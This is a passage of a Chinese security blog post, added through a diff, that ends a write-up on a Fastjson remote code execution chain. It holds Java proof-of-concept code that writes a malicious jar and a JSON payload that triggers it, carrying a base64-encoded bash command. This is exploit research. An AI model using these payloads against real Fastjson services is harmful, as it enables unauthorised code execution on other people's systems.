+</span><br><span class="line">                <span class="string">&quot;  &#125;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &#125;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &#125;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &#125;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(poc1);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            JSON.parseObject(poc1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(poc2.replace(<span class="string">&quot;WriterOutputStream2&quot;</span>, <span class="string">&quot;WriterOutputStream&quot;</span>));</span><br><span class="line"><span class="comment">//        JSON.parseObject(poc2);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bytesToHexString</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : bytes) &#123;</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;\\x%02X&quot;</span>, b));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603081542369.png" alt="image-20260308151915188"></p>
+<p>可以看到恶意jar已被写入</p>
+<p>最后通过Exception来触发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;@type&quot;: &quot;java.lang.Exception&quot;,</span><br><span class="line">&quot;@type&quot;: &quot;sun.net.spi.nameservice.dns.DNSNameServiceDescriptor&quot;,</span><br><span class="line">&quot;message&quot;: &quot;bash -c &#123;echo,aWQgPiAvdG1wL3B3bmVk&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603081542326.png" alt="image-20260308151956571"></p>
+<p>爆破路径的脚本可以参考：<a target="_blank" rel="noopener" href="https://github.com/kezibei/fastjson_payload/blob/main/web.py">https://github.com/kezibei/fastjson_payload/blob/main/web.py</a></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/3wBOOlcHN5cX8mqw7J-yXA?scene=1&click_id=14">fastjson写文件挑战</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9e0V4bnV6fuGAfO1AKLYdw?scene=1&click_id=15">[Java Puzzle #3 WP] Fastjson write ascii JAR RCE</a></p>
+
+  </div>
+
+  
+  <div class="about">
+    <h1>About this Post</h1>
+    <div class="details">
+      <p>This post is written by p0l1st, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+    
+    <p class="tags">
+      <i class="bi bi-tags icon"></i>
+      
+      <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="tag">#Java安全</a>
+      
+    </p>
+    
+  </div>
+  
+
+  <div class="container post-prev-next">
+    <a class="next"></a>
+    
+    <a href="/2026/03/03/Express%E5%BA%94%E2%BD%A4%E9%A2%84%E5%A4%84%E7%90%86%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A0%A1%E9%AA%8C%E5%AE%9E%E7%8E%B0XSS/" class="prev">
+      <div class="text">
+        <p class="label">Previous</p>
+        <h3 class="title">Express应⽤预处理特性绕过服务端校验实现XSS</h3>
+      </div>
+    </a>
+    
+  </div>
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <footer>
+  <div class="inner">
+    <div class="links">
+      
+      <div class="group">
+        <h2 class="title">Blog</h2>
+        
+        <a href="/" class="item">Home</a>
+        
+        <a href="/archives" class="item">Archives</a>
+        
+        <a href="/tags" class="item">Tags</a>
+        
+        <a href="/categories" class="item">Categories</a>
+        
+        <a href="/search" class="item">Search</a>
+        
+        <a href="/friends" class="item">Friends</a>
+        
+        <a href="/about" class="item">About</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Me</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/p0l1st" class="item">GitHub</a>
+        
+        <a target="_blank" rel="noopener" href="https://yuque.com/p0l1st" class="item">语雀</a>
+        
+      </div>
+      
+    </div>
+    <span>&copy; 2026 p0l1st<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+    
+    
+      <br>
+      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+        <label>
+          <input type="radio" value="light">
+          <span>Light</span>
+        </label>
+        <label>
+          <input type="radio" value="dark">
+          <span>Dark</span>
+        </label>
+        <label>
+          <input type="radio" value="auto">
+          <span>Auto</span>
+        </label>
+      </div>
+    
+  </div>
+</footer>
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+    
+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+  </body>
+</html>
